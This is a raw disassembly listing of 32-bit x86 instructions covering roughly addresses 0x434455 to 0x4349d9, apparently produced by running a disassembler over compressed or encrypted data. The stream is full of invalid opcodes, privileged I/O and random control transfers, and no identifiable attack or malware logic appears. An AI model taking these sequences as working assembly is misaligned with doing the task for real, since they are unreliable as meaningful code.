  434455:	3c 5d                	cmp    $0x5d,%al
  434457:	d6                   	salc
  434458:	4a                   	dec    %edx
  434459:	86 e3                	xchg   %ah,%bl
  43445b:	9f                   	lahf
  43445c:	f5                   	cmc
  43445d:	59                   	pop    %ecx
  43445e:	20 24 ae             	and    %ah,(%esi,%ebp,4)
  434461:	27                   	daa
  434462:	04 dc                	add    $0xdc,%al
  434464:	9f                   	lahf
  434465:	07                   	pop    %es
  434466:	d9 4f 3a             	(bad) 0x3a(%edi)
  434469:	84 3d e9 86 38 cb    	test   %bh,0xcb3886e9
  43446f:	19 6d ef             	sbb    %ebp,-0x11(%ebp)
  434472:	aa                   	stos   %al,%es:(%edi)
  434473:	87 a3 25 03 b8 e6    	xchg   %esp,-0x1947fcdb(%ebx)
  434479:	7c 8f                	jl     0x43440a
  43447b:	62 57 e4             	bound  %edx,-0x1c(%edi)
  43447e:	a8 d8                	test   $0xd8,%al
  434480:	a1 ad 37 34 fc       	mov    0xfc3437ad,%eax
  434485:	16                   	push   %ss
  434486:	5d                   	pop    %ebp
  434487:	da a9 a1 8e a7 07    	fisubrl 0x7a78ea1(%ecx)
  43448d:	ac                   	lods   %ds:(%esi),%al
  43448e:	7e af                	jle    0x43443f
  434490:	19 d4                	sbb    %edx,%esp
  434492:	19 5b 67             	sbb    %ebx,0x67(%ebx)
  434495:	d1 f8                	sar    $1,%eax
  434497:	92                   	xchg   %eax,%edx
  434498:	cf                   	iret
  434499:	26 00 70 e7          	add    %dh,%es:-0x19(%eax)
  43449d:	aa                   	stos   %al,%es:(%edi)
  43449e:	cf                   	iret
  43449f:	d3 ca                	ror    %cl,%edx
  4344a1:	f9                   	stc
  4344a2:	60                   	pusha
  4344a3:	02 2f                	add    (%edi),%ch
  4344a5:	29 97 c6 e1 87 44    	sub    %edx,0x4487e1c6(%edi)
  4344ab:	d2 f4                	shl    %cl,%ah
  4344ad:	03 fe                	add    %esi,%edi
  4344af:	af                   	scas   %es:(%edi),%eax
  4344b0:	51                   	push   %ecx
  4344b1:	3b 12                	cmp    (%edx),%edx
  4344b3:	2d 9d ce 45 df       	sub    $0xdf45ce9d,%eax
  4344b8:	d7                   	xlat   %ds:(%ebx)
  4344b9:	64 ad                	lods   %fs:(%esi),%eax
  4344bb:	f7 e8                	imul   %eax
  4344bd:	a9 5b 9b 82 d0       	test   $0xd0829b5b,%eax
  4344c2:	83 92 cb 38 27 17 9a 	adcl   $0xffffff9a,0x172738cb(%edx)
  4344c9:	09 e0                	or     %esp,%eax
  4344cb:	a2 38 0b f5 36       	mov    %al,0x36f50b38
  4344d0:	9d                   	popf
  4344d1:	d8 c7                	fadd   %st(7),%st
  4344d3:	7b bd                	jnp    0x434492
  4344d5:	0b 92 de f2 d2 c4    	or     -0x3b2d0d22(%edx),%edx
  4344db:	2e 4a                	cs dec %edx
  4344dd:	64 ea e9 8a eb 67 ad 	fs ljmp $0xe8ad,$0x67eb8ae9
  4344e4:	e8 
  4344e5:	3f                   	aas
  4344e6:	3b 15 d3 19 7e fd    	cmp    0xfd7e19d3,%edx
  4344ec:	19 93 80 f2 06 3a    	sbb    %edx,0x3a06f280(%ebx)
  4344f2:	90                   	nop
  4344f3:	2d 4c 13 d6 d3       	sub    $0xd3d6134c,%eax
  4344f8:	17                   	pop    %ss
  4344f9:	41                   	inc    %ecx
  4344fa:	6b ca 9d             	imul   $0xffffff9d,%edx,%ecx
  4344fd:	e1 49                	loope  0x434548
  4344ff:	52                   	push   %edx
  434500:	2c 25                	sub    $0x25,%al
  434502:	e1 b2                	loope  0x4344b6
  434504:	9e                   	sahf
  434505:	b3 f8                	mov    $0xf8,%bl
  434507:	4f                   	dec    %edi
  434508:	7a 8e                	jp     0x434498
  43450a:	a9 57 99 e5 b6       	test   $0xb6e59957,%eax
  43450f:	d6                   	salc
  434510:	e4 aa                	in     $0xaa,%al
  434512:	c0 a5 cc 46 c9 0c 39 	shlb   $0x39,0xcc946cc(%ebp)
  434519:	82 ac 3c a6 27 e3 4a 	subb   $0xe4,0x4ae327a6(%esp,%edi,1)
  434520:	e4 
  434521:	07                   	pop    %es
  434522:	91                   	xchg   %eax,%ecx
  434523:	97                   	xchg   %eax,%edi
  434524:	65 47                	gs inc %edi
  434526:	36 ee                	ss out %al,(%dx)
  434528:	9c                   	pushf
  434529:	f0 ef                	lock out %eax,(%dx)
  43452b:	75 87                	jne    0x4344b4
  43452d:	c6                   	(bad)
  43452e:	8c 70 68             	mov    %?,0x68(%eax)
  434531:	7c 07                	jl     0x43453a
  434533:	14 3d                	adc    $0x3d,%al
  434535:	13 09                	adc    (%ecx),%ecx
  434537:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  434538:	cb                   	lret
  434539:	06                   	push   %es
  43453a:	ec                   	in     (%dx),%al
  43453b:	40                   	inc    %eax
  43453c:	5c                   	pop    %esp
  43453d:	0b ff                	or     %edi,%edi
  43453f:	69 9a 0f df 8e b1 19 	imul   $0x4e1d4919,-0x4e7120f1(%edx),%ebx
  434546:	49 1d 4e 
  434549:	25 e0 d0 ea 0d       	and    $0xdead0e0,%eax
  43454e:	1d 00 a3 85 dc       	sbb    $0xdc85a300,%eax
  434553:	c3                   	ret
  434554:	04 fa                	add    $0xfa,%al
  434556:	86 e4                	xchg   %ah,%ah
  434558:	b3 4a                	mov    $0x4a,%bl
  43455a:	ed                   	in     (%dx),%eax
  43455b:	d0 80 dd f6 28 ca    	rolb   $1,-0x35d70923(%eax)
  434561:	34 29                	xor    $0x29,%al
  434563:	e5 a4                	in     $0xa4,%eax
  434565:	b5 36                	mov    $0x36,%ch
  434567:	6b 38 c3             	imul   $0xffffffc3,(%eax),%edi
  43456a:	14 52                	adc    $0x52,%al
  43456c:	20 3e                	and    %bh,(%esi)
  43456e:	be 4c fb ed e3       	mov    $0xe3edfb4c,%esi
  434573:	cf                   	iret
  434574:	98                   	cwtl
  434575:	17                   	pop    %ss
  434576:	51                   	push   %ecx
  434577:	fd                   	std
  434578:	4b                   	dec    %ebx
  434579:	07                   	pop    %es
  43457a:	46                   	inc    %esi
  43457b:	6d                   	insl   (%dx),%es:(%edi)
  43457c:	d3 88 79 4a de 19    	rorl   %cl,0x19de4a79(%eax)
  434582:	61                   	popa
  434583:	c4                   	(bad)
  434584:	f7 0c bf 39 f3 59 8f 	testl  $0x8f59f339,(%edi,%edi,4)
  43458b:	64 fd                	fs std
  43458d:	db 83 fd 40 ee b2    	fildl  -0x4d11bf03(%ebx)
  434593:	5d                   	pop    %ebp
  434594:	c6                   	(bad)
  434595:	9b                   	fwait
  434596:	9e                   	sahf
  434597:	60                   	pusha
  434598:	b4 36                	mov    $0x36,%ah
  43459a:	b1 f2                	mov    $0xf2,%cl
  43459c:	3e 2d 08 23 53 61    	ds sub $0x61532308,%eax
  4345a2:	17                   	pop    %ss
  4345a3:	a2 e1 c0 5b cd       	mov    %al,0xcd5bc0e1
  4345a8:	2c af                	sub    $0xaf,%al
  4345aa:	e8 bc 20 b3 2b       	call   0x2bf6666b
  4345af:	5f                   	pop    %edi
  4345b0:	50                   	push   %eax
  4345b1:	36 47                	ss inc %edi
  4345b3:	58                   	pop    %eax
  4345b4:	6e                   	outsb  %ds:(%esi),(%dx)
  4345b5:	d9 7b 28             	fnstcw 0x28(%ebx)
  4345b8:	64 76 d4             	fs jbe 0x43458f
  4345bb:	da 00                	fiaddl (%eax)
  4345bd:	3f                   	aas
  4345be:	b5 99                	mov    $0x99,%ch
  4345c0:	90                   	nop
  4345c1:	b0 02                	mov    $0x2,%al
  4345c3:	f4                   	hlt
  4345c4:	e4 06                	in     $0x6,%al
  4345c6:	f4                   	hlt
  4345c7:	0f a4 8e 57 55 a0 ca 	shld   $0xba,%ecx,-0x355faaa9(%esi)
  4345ce:	ba 
  4345cf:	5a                   	pop    %edx
  4345d0:	71 07                	jno    0x4345d9
  4345d2:	68 f6 c7 08 fb       	push   $0xfb08c7f6
  4345d7:	b4 e1                	mov    $0xe1,%ah
  4345d9:	cc                   	int3
  4345da:	ab                   	stos   %eax,%es:(%edi)
  4345db:	d0 7e c9             	sarb   $1,-0x37(%esi)
  4345de:	1b fe                	sbb    %esi,%edi
  4345e0:	3a 9e c4 d3 f2 05    	cmp    0x5f2d3c4(%esi),%bl
  4345e6:	69 5a 0a 91 9f 9d 24 	imul   $0x249d9f91,0xa(%edx),%ebx
  4345ed:	0e                   	push   %cs
  4345ee:	ae                   	scas   %es:(%edi),%al
  4345ef:	b2 dd                	mov    $0xdd,%dl
  4345f1:	db 41 fc             	fildl  -0x4(%ecx)
  4345f4:	f9                   	stc
  4345f5:	56                   	push   %esi
  4345f6:	47                   	inc    %edi
  4345f7:	e7 f2                	out    %eax,$0xf2
  4345f9:	57                   	push   %edi
  4345fa:	98                   	cwtl
  4345fb:	48                   	dec    %eax
  4345fc:	93                   	xchg   %eax,%ebx
  4345fd:	cf                   	iret
  4345fe:	ac                   	lods   %ds:(%esi),%al
  4345ff:	b5 a3                	mov    $0xa3,%ch
  434601:	34 66                	xor    $0x66,%al
  434603:	71 0c                	jno    0x434611
  434605:	6f                   	outsl  %ds:(%esi),(%dx)
  434606:	34 b9                	xor    $0xb9,%al
  434608:	9b                   	fwait
  434609:	c1 5e 42 ab          	rcrl   $0xab,0x42(%esi)
  43460d:	c2 bd b3             	ret    $0xb3bd
  434610:	4e                   	dec    %esi
  434611:	bc fa 22 08 20       	mov    $0x200822fa,%esp
  434616:	f0 e6 91             	lock out %al,$0x91
  434619:	fc                   	cld
  43461a:	c2 23 d4             	ret    $0xd423
  43461d:	f7 b4 92 dd ee 82 58 	divl   0x5882eedd(%edx,%edx,4)
  434624:	16                   	push   %ss
  434625:	88 28                	mov    %ch,(%eax)
  434627:	44                   	inc    %esp
  434628:	70 80                	jo     0x4345aa
  43462a:	2d 19 29 50 79       	sub    $0x79502919,%eax
  43462f:	36 05 3b fc 07 eb    	ss add $0xeb07fc3b,%eax
  434635:	e6 d9                	out    %al,$0xd9
  434637:	f9                   	stc
  434638:	00 af 3a 6e d3 01    	add    %ch,0x1d36e3a(%edi)
  43463e:	d0 8c cb 94 5a 3f c7 	rorb   $1,-0x38c0a56c(%ebx,%ecx,8)
  434645:	57                   	push   %edi
  434646:	45                   	inc    %ebp
  434647:	8a e0                	mov    %al,%ah
  434649:	c7                   	(bad)
  43464a:	31 95 c3 b8 f6 86    	xor    %edx,-0x7909473d(%ebp)
  434650:	4a                   	dec    %edx
  434651:	70 00                	jo     0x434653
  434653:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  434654:	b7 30                	mov    $0x30,%bh
  434656:	e9 2d 6a d4 4d       	jmp    0x4e17b088
  43465b:	0c 50                	or     $0x50,%al
  43465d:	df 16                	fists  (%esi)
  43465f:	ab                   	stos   %eax,%es:(%edi)
  434660:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  434661:	59                   	pop    %ecx
  434662:	51                   	push   %ecx
  434663:	2b cd                	sub    %ebp,%ecx
  434665:	9b                   	fwait
  434666:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  434667:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  434668:	4e                   	dec    %esi
  434669:	75 49                	jne    0x4346b4
  43466b:	d9 fb                	fsincos
  43466d:	05 4c 73 39 95       	add    $0x9539734c,%eax
  434672:	58                   	pop    %eax
  434673:	ea 11 c2 9c cb 34 46 	ljmp   $0x4634,$0xcb9cc211
  43467a:	fa                   	cli
  43467b:	aa                   	stos   %al,%es:(%edi)
  43467c:	75 40                	jne    0x4346be
  43467e:	1a da                	sbb    %dl,%bl
  434680:	fd                   	std
  434681:	d8 58 95             	fcomps -0x6b(%eax)
  434684:	4d                   	dec    %ebp
  434685:	ef                   	out    %eax,(%dx)
  434686:	34 20                	xor    $0x20,%al
  434688:	92                   	xchg   %eax,%edx
  434689:	44                   	inc    %esp
  43468a:	ae                   	scas   %es:(%edi),%al
  43468b:	e3 4e                	jecxz  0x4346db
  43468d:	d4 73                	aam    $0x73
  43468f:	98                   	cwtl
  434690:	79 12                	jns    0x4346a4
  434692:	04 3c                	add    $0x3c,%al
  434694:	d8 d6                	fcom   %st(6)
  434696:	c9                   	leave
  434697:	9b df 7e 2a          	fistpll 0x2a(%esi)
  43469b:	6c                   	insb   (%dx),%es:(%edi)
  43469c:	0d e3 3c 9e 88       	or     $0x889e3ce3,%eax
  4346a1:	6c                   	insb   (%dx),%es:(%edi)
  4346a2:	e2 fc                	loop   0x4346a0
  4346a4:	c2 26 02             	ret    $0x226
  4346a7:	ad                   	lods   %ds:(%esi),%eax
  4346a8:	43                   	inc    %ebx
  4346a9:	bf f0 00 b8 8a       	mov    $0x8ab800f0,%edi
  4346ae:	3b bd a2 3b 5f fa    	cmp    -0x5a0c45e(%ebp),%edi
  4346b4:	83 c1 7d             	add    $0x7d,%ecx
  4346b7:	11 3c ed 70 ae 40 0c 	adc    %edi,0xc40ae70(,%ebp,8)
  4346be:	6e                   	outsb  %ds:(%esi),(%dx)
  4346bf:	d2 fa                	sar    %cl,%dl
  4346c1:	8f                   	(bad)
  4346c2:	cc                   	int3
  4346c3:	bf 3e 29 ca 4d       	mov    $0x4dca293e,%edi
  4346c8:	91                   	xchg   %eax,%ecx
  4346c9:	89 d2                	mov    %edx,%edx
  4346cb:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4346cc:	93                   	xchg   %eax,%ebx
  4346cd:	42                   	inc    %edx
  4346ce:	2c e0                	sub    $0xe0,%al
  4346d0:	69 e2 5f 95 cb 04    	imul   $0x4cb955f,%edx,%esp
  4346d6:	e6 f3                	out    %al,$0xf3
  4346d8:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4346d9:	d4 b0                	aam    $0xb0
  4346db:	91                   	xchg   %eax,%ecx
  4346dc:	c1 36 c0             	shll   $0xc0,(%esi)
  4346df:	1c 7f                	sbb    $0x7f,%al
  4346e1:	bc 12 b7 4d db       	mov    $0xdb4db712,%esp
  4346e6:	78 e6                	js     0x4346ce
  4346e8:	ad                   	lods   %ds:(%esi),%eax
  4346e9:	af                   	scas   %es:(%edi),%eax
  4346ea:	0a 9b 9c a2 17 46    	or     0x4617a29c(%ebx),%bl
  4346f0:	cf                   	iret
  4346f1:	d1 55 54             	rcll   $1,0x54(%ebp)
  4346f4:	f9                   	stc
  4346f5:	09 94 e9 cb 1d 04 7f 	or     %edx,0x7f041dcb(%ecx,%ebp,8)
  4346fc:	7e ad                	jle    0x4346ab
  4346fe:	e9 49 b6 f9 d6       	jmp    0xd73cfd4c
  434703:	9b                   	fwait
  434704:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  434705:	0d c3 49 5f cc       	or     $0xcc5f49c3,%eax
  43470a:	b1 e0                	mov    $0xe0,%cl
  43470c:	ae                   	scas   %es:(%edi),%al
  43470d:	90                   	nop
  43470e:	5e                   	pop    %esi
  43470f:	95                   	xchg   %eax,%ebp
  434710:	fd                   	std
  434711:	16                   	push   %ss
  434712:	b2 7e                	mov    $0x7e,%dl
  434714:	40                   	inc    %eax
  434715:	e6 67                	out    %al,$0x67
  434717:	1d b3 7f 79 20       	sbb    $0x20797fb3,%eax
  43471c:	10 35 45 f6 c7 6e    	adc    %dh,0x6ec7f645
  434722:	37                   	aaa
  434723:	95                   	xchg   %eax,%ebp
  434724:	77 30                	ja     0x434756
  434726:	38 13                	cmp    %dl,(%ebx)
  434728:	a3 2c fa 7a 37       	mov    %eax,0x377afa2c
  43472d:	ca 04 88             	lret   $0x8804
  434730:	3c 32                	cmp    $0x32,%al
  434732:	fb                   	sti
  434733:	7c c2                	jl     0x4346f7
  434735:	9b                   	fwait
  434736:	17                   	pop    %ss
  434737:	e1 0b                	loope  0x434744
  434739:	6f                   	outsl  %ds:(%esi),(%dx)
  43473a:	2d 9c c3 c7 d5       	sub    $0xd5c7c39c,%eax
  43473f:	6f                   	outsl  %ds:(%esi),(%dx)
  434740:	21 17                	and    %edx,(%edi)
  434742:	98                   	cwtl
  434743:	55                   	push   %ebp
  434744:	34 74                	xor    $0x74,%al
  434746:	79 e8                	jns    0x434730
  434748:	75 63                	jne    0x4347ad
  43474a:	f6 51 02             	notb   0x2(%ecx)
  43474d:	8d 7b 10             	lea    0x10(%ebx),%edi
  434750:	d3 cb                	ror    %cl,%ebx
  434752:	e8 0d 13 35 ee       	call   0xee785a64
  434757:	a0 6d dc 32 eb       	mov    0xeb32dc6d,%al
  43475c:	e8 a0 cd c3 31       	call   0x32071501
  434761:	5e                   	pop    %esi
  434762:	3b e6                	cmp    %esi,%esp
  434764:	ef                   	out    %eax,(%dx)
  434765:	6a df                	push   $0xffffffdf
  434767:	09 b3 c4 14 1d 86    	or     %esi,-0x79e2eb3c(%ebx)
  43476d:	0a 33                	or     (%ebx),%dh
  43476f:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  434770:	2e f5                	cs cmc
  434772:	cc                   	int3
  434773:	b9 52 68 4b bd       	mov    $0xbd4b6852,%ecx
  434778:	1f                   	pop    %ds
  434779:	14 22                	adc    $0x22,%al
  43477b:	0a 37                	or     (%edi),%dh
  43477d:	b8 43 d9 54 14       	mov    $0x1454d943,%eax
  434782:	4d                   	dec    %ebp
  434783:	42                   	inc    %edx
  434784:	54                   	push   %esp
  434785:	8f                   	(bad)
  434786:	d1 63 d9             	shll   $1,-0x27(%ebx)
  434789:	3d ad 54 0a 16       	cmp    $0x160a54ad,%eax
  43478e:	4b                   	dec    %ebx
  43478f:	a0 87 68 14 68       	mov    0x68146887,%al
  434794:	32 04 e8             	xor    (%eax,%ebp,8),%al
  434797:	ff                   	ljmp   (bad)
  434798:	e8 2a d5 bd 2f       	call   0x30011cc7
  43479d:	c3                   	ret
  43479e:	33 c0                	xor    %eax,%eax
  4347a0:	50                   	push   %eax
  4347a1:	c5 62 f6             	lds    -0xa(%edx),%esp
  4347a4:	94                   	xchg   %eax,%esp
  4347a5:	9f                   	lahf
  4347a6:	f9                   	stc
  4347a7:	b3 bc                	mov    $0xbc,%bl
  4347a9:	50                   	push   %eax
  4347aa:	68 4c 97 a1 04       	push   $0x4a1974c
  4347af:	52                   	push   %edx
  4347b0:	99                   	cltd
  4347b1:	4c                   	dec    %esp
  4347b2:	2c 1f                	sub    $0x1f,%al
  4347b4:	7c 06                	jl     0x4347bc
  4347b6:	ba f8 60 a2 f0       	mov    $0xf0a260f8,%edx
  4347bb:	8c f2                	mov    %?,%edx
  4347bd:	ad                   	lods   %ds:(%esi),%eax
  4347be:	1a 69 d2             	sbb    -0x2e(%ecx),%ch
  4347c1:	12 5f 4c             	adc    0x4c(%edi),%bl
  4347c4:	43                   	inc    %ebx
  4347c5:	a3 96 cf ab 62       	mov    %eax,0x62abcf96
  4347ca:	47                   	inc    %edi
  4347cb:	19 36                	sbb    %esi,(%esi)
  4347cd:	71 99                	jno    0x434768
  4347cf:	7f 22                	jg     0x4347f3
  4347d1:	06                   	push   %es
  4347d2:	f7 6b 81             	imull  -0x7f(%ebx)
  4347d5:	f3 27                	repz daa
  4347d7:	b6 1c                	mov    $0x1c,%dh
  4347d9:	4a                   	dec    %edx
  4347da:	0c 1e                	or     $0x1e,%al
  4347dc:	7e 83                	jle    0x434761
  4347de:	a3 24 7a b7 fb       	mov    %eax,0xfbb77a24
  4347e3:	84 a4 17 db 25 b7 08 	test   %ah,0x8b725db(%edi,%edx,1)
  4347ea:	86 21                	xchg   %ah,(%ecx)
  4347ec:	89 d5                	mov    %edx,%ebp
  4347ee:	ce                   	into
  4347ef:	e6 58                	out    %al,$0x58
  4347f1:	63 6f 7c             	arpl   %ebp,0x7c(%edi)
  4347f4:	a1 92 55 a3 e1       	mov    0xe1a35592,%eax
  4347f9:	67 b8 bc a7 13 b1    	addr16 mov $0xb113a7bc,%eax
  4347ff:	cb                   	lret
  434800:	4e                   	dec    %esi
  434801:	54                   	push   %esp
  434802:	f4                   	hlt
  434803:	a3 cd d5 59 54       	mov    %eax,0x5459d5cd
  434808:	54                   	push   %esp
  434809:	ef                   	out    %eax,(%dx)
  43480a:	be 8e e0 80 fb       	mov    $0xfb80e08e,%esi
  43480f:	59                   	pop    %ecx
  434810:	a0 9d ab 2e 0e       	mov    0xe2eab9d,%al
  434815:	45                   	inc    %ebp
  434816:	4c                   	dec    %esp
  434817:	e8 c0 5e 46 35       	call   0x3589a6dc
  43481c:	28 9a 24 79 05 62    	sub    %bl,0x62057924(%edx)
  434822:	fc                   	cld
  434823:	8a 50 3a             	mov    0x3a(%eax),%dl
  434826:	19 4b 51             	sbb    %ecx,0x51(%ebx)
  434829:	4f                   	dec    %edi
  43482a:	e6 69                	out    %al,$0x69
  43482c:	d3 bb b5 f1 43 ee    	sarl   %cl,-0x11bc0e4b(%ebx)
  434832:	98                   	cwtl
  434833:	b8 09 6b aa 6b       	mov    $0x6baa6b09,%eax
  434838:	d6                   	salc
  434839:	e0 25                	loopne 0x434860
  43483b:	82 40 15 23          	addb   $0x23,0x15(%eax)
  43483f:	1c f1                	sbb    $0xf1,%al
  434841:	74 28                	je     0x43486b
  434843:	e3 4c                	jecxz  0x434891
  434845:	d1 b1 36 d0 d3 75    	shll   $1,0x75d3d036(%ecx)
  43484b:	6f                   	outsl  %ds:(%esi),(%dx)
  43484c:	07                   	pop    %es
  43484d:	58                   	pop    %eax
  43484e:	54                   	push   %esp
  43484f:	00 4b 6a             	add    %cl,0x6a(%ebx)
  434852:	82 62 e7 4a          	andb   $0x4a,-0x19(%edx)
  434856:	2c a5                	sub    $0xa5,%al
  434858:	4e                   	dec    %esi
  434859:	99                   	cltd
  43485a:	f8                   	clc
  43485b:	62 ac 7c a9 81 9e 85 	bound  %ebp,-0x7a617e57(%esp,%edi,2)
  434862:	ee                   	out    %al,(%dx)
  434863:	b6 b8                	mov    $0xb8,%dh
  434865:	d1 f7                	shl    $1,%edi
  434867:	78 82                	js     0x4347eb
  434869:	fb                   	sti
  43486a:	7c 6c                	jl     0x4348d8
  43486c:	72 d7                	jb     0x434845
  43486e:	31 6d ad             	xor    %ebp,-0x53(%ebp)
  434871:	aa                   	stos   %al,%es:(%edi)
  434872:	c2 1f c7             	ret    $0xc71f
  434875:	60                   	pusha
  434876:	13 39                	adc    (%ecx),%edi
  434878:	3b 4a 62             	cmp    0x62(%edx),%ecx
  43487b:	3e ed                	ds in  (%dx),%eax
  43487d:	75 18                	jne    0x434897
  43487f:	b7 3d                	mov    $0x3d,%bh
  434881:	16                   	push   %ss
  434882:	94                   	xchg   %eax,%esp
  434883:	cc                   	int3
  434884:	ba 4f 1d 7b 6d       	mov    $0x6d7b1d4f,%edx
  434889:	fb                   	sti
  43488a:	da 4f dd             	fimull -0x23(%edi)
  43488d:	b9 ae bf 62 1f       	mov    $0x1f62bfae,%ecx
  434892:	2f                   	das
  434893:	ac                   	lods   %ds:(%esi),%al
  434894:	e6 01                	out    %al,$0x1
  434896:	08 b3 e4 30 cf 5f    	or     %dh,0x5fcf30e4(%ebx)
  43489c:	f3 c6                	repz (bad)
  43489e:	e5 27                	in     $0x27,%eax
  4348a0:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4348a1:	4f                   	dec    %edi
  4348a2:	cb                   	lret
  4348a3:	7f 14                	jg     0x4348b9
  4348a5:	da f5                	(bad)
  4348a7:	b0 87                	mov    $0x87,%al
  4348a9:	52                   	push   %edx
  4348aa:	09 99 86 c1 94 a7    	or     %ebx,-0x586b3e7a(%ecx)
  4348b0:	d7                   	xlat   %ds:(%ebx)
  4348b1:	4e                   	dec    %esi
  4348b2:	93                   	xchg   %eax,%ebx
  4348b3:	f4                   	hlt
  4348b4:	fa                   	cli
  4348b5:	94                   	xchg   %eax,%esp
  4348b6:	39 ed                	cmp    %ebp,%ebp
  4348b8:	e6 63                	out    %al,$0x63
  4348ba:	43                   	inc    %ebx
  4348bb:	5c                   	pop    %esp
  4348bc:	16                   	push   %ss
  4348bd:	d0 20                	shlb   $1,(%eax)
  4348bf:	22 34 1d 5e 8f 4b f9 	and    -0x6b470a2(,%ebx,1),%dh
  4348c6:	0a a0 bd b3 6f 9d    	or     -0x62904c43(%eax),%ah
  4348cc:	63 07                	arpl   %eax,(%edi)
  4348ce:	02 57 3f             	add    0x3f(%edi),%dl
  4348d1:	7c 6b                	jl     0x43493e
  4348d3:	32 a7 31 40 e7 ab    	xor    -0x5418bfcf(%edi),%ah
  4348d9:	8d 36                	lea    (%esi),%esi
  4348db:	89 cf                	mov    %ecx,%edi
  4348dd:	66 1f                	popw   %ds
  4348df:	f7 ec                	imul   %esp
  4348e1:	a9 1c cc b3 dd       	test   $0xddb3cc1c,%eax
  4348e6:	5a                   	pop    %edx
  4348e7:	fd                   	std
  4348e8:	c6                   	(bad)
  4348e9:	f5                   	cmc
  4348ea:	b7 f4                	mov    $0xf4,%bh
  4348ec:	2a 18                	sub    (%eax),%bl
  4348ee:	8b cb                	mov    %ebx,%ecx
  4348f0:	0c d7                	or     $0xd7,%al
  4348f2:	5a                   	pop    %edx
  4348f3:	10 61 c4             	adc    %ah,-0x3c(%ecx)
  4348f6:	58                   	pop    %eax
  4348f7:	c6                   	(bad)
  4348f8:	fa                   	cli
  4348f9:	0c 53                	or     $0x53,%al
  4348fb:	58                   	pop    %eax
  4348fc:	75 52                	jne    0x434950
  4348fe:	87 d0                	xchg   %edx,%eax
  434900:	53                   	push   %ebx
  434901:	ca 58 a1             	lret   $0xa158
  434904:	09 65 51             	or     %esp,0x51(%ebp)
  434907:	70 ca                	jo     0x4348d3
  434909:	86 3e                	xchg   %bh,(%esi)
  43490b:	7b 10                	jnp    0x43491d
  43490d:	5b                   	pop    %ebx
  43490e:	ec                   	in     (%dx),%al
  43490f:	d8 ff                	fdivr  %st(7),%st
  434911:	ff 9f ea e8 2b 22    	lcall  *0x222be8ea(%edi)
  434917:	2c 6e                	sub    $0x6e,%al
  434919:	f5                   	cmc
  43491a:	2d ea 49 8c 9d       	sub    $0x9d8c49ea,%eax
  43491f:	e9 22 99 92 4f       	jmp    0x4fd5e246
  434924:	36 be 14 e4 a3 57    	ss mov $0x57a3e414,%esi
  43492a:	af                   	scas   %es:(%edi),%eax
  43492b:	fd                   	std
  43492c:	37                   	aaa
  43492d:	c5 60 f0             	lds    -0x10(%eax),%esp
  434930:	6d                   	insl   (%dx),%es:(%edi)
  434931:	c9                   	leave
  434932:	1c de                	sbb    $0xde,%al
  434934:	3d 45 ec 6c 44       	cmp    $0x446cec45,%eax
  434939:	9f                   	lahf
  43493a:	76 b1                	jbe    0x4348ed
  43493c:	98                   	cwtl
  43493d:	ef                   	out    %eax,(%dx)
  43493e:	28 92 6c 7c de c3    	sub    %dl,-0x3c218394(%edx)
  434944:	ff 63 02             	jmp    *0x2(%ebx)
  434947:	ff 10                	call   *(%eax)
  434949:	1f                   	pop    %ds
  43494a:	8b a3 a3 01 1b d4    	mov    -0x2be4fe5d(%ebx),%esp
  434950:	71 32                	jno    0x434984
  434952:	8b 3d ae ac c2 dc    	mov    0xdcc2acae,%edi
  434958:	45                   	inc    %ebp
  434959:	50                   	push   %eax
  43495a:	88 1d 5e 1a 96 ed    	mov    %bl,0xed961a5e
  434960:	58                   	pop    %eax
  434961:	c7                   	(bad)
  434962:	1c 41                	sbb    $0x41,%al
  434964:	9d                   	popf
  434965:	12 64 70 da          	adc    -0x26(%eax,%esi,2),%ah
  434969:	10 25 70 30 8d cc    	adc    %ah,0xcc8d3070
  43496f:	14 84                	adc    $0x84,%al
  434971:	63 86 e1 e8 4a 72    	arpl   %eax,0x724ae8e1(%esi)
  434977:	b7 e0                	mov    $0xe0,%bh
  434979:	ae                   	scas   %es:(%edi),%al
  43497a:	16                   	push   %ss
  43497b:	b2 5b                	mov    $0x5b,%dl
  43497d:	33 40 fb             	xor    -0x5(%eax),%eax
  434980:	46                   	inc    %esi
  434981:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  434982:	89 fa                	mov    %edi,%edx
  434984:	75 cc                	jne    0x434952
  434986:	a1 52 33 34 d9       	mov    0xd9343352,%eax
  43498b:	53                   	push   %ebx
  43498c:	35 01 9b dc 14       	xor    $0x14dc9b01,%eax
  434991:	39 33                	cmp    %esi,(%ebx)
  434993:	75 0a                	jne    0x43499f
  434995:	b1 15                	mov    $0x15,%cl
  434997:	f1                   	int1
  434998:	6d                   	insl   (%dx),%es:(%edi)
  434999:	07                   	pop    %es
  43499a:	29 15 64 8c df 2c    	sub    %edx,0x2cdf8c64
  4349a0:	a3 65 aa bd 17       	mov    %eax,0x17bdaa65
  4349a5:	7e 55                	jle    0x4349fc
  4349a7:	91                   	xchg   %eax,%ecx
  4349a8:	63 a4 0f bc 02 09 14 	arpl   %esp,0x140902bc(%edi,%ecx,1)
  4349af:	4f                   	dec    %edi
  4349b0:	4f                   	dec    %edi
  4349b1:	45                   	inc    %ebp
  4349b2:	79 b4                	jns    0x434968
  4349b4:	16                   	push   %ss
  4349b5:	f4                   	hlt
  4349b6:	6b 5a 9f 63          	imul   $0x63,-0x61(%edx),%ebx
  4349ba:	20 76 7e             	and    %dh,0x7e(%esi)
  4349bd:	87 53 2d             	xchg   %edx,0x2d(%ebx)
  4349c0:	f1                   	int1
  4349c1:	d0 c5                	rol    $1,%ch
  4349c3:	fd                   	std
  4349c4:	be ee 3d 56 34       	mov    $0x34563dee,%esi
  4349c9:	53                   	push   %ebx
  4349ca:	57                   	push   %edi
  4349cb:	99                   	cltd
  4349cc:	dd 2e                	(bad) (%esi)
  4349ce:	96                   	xchg   %eax,%esi
  4349cf:	65 8e 74 e6 2e       	mov    %gs:0x2e(%esi,%eiz,8),%?
  4349d4:	7a 98                	jp     0x43496e
  4349d6:	2e 7c f9             	jl,pn  0x4349d2
  4349d9:	d9 f9                	fyl2xp1
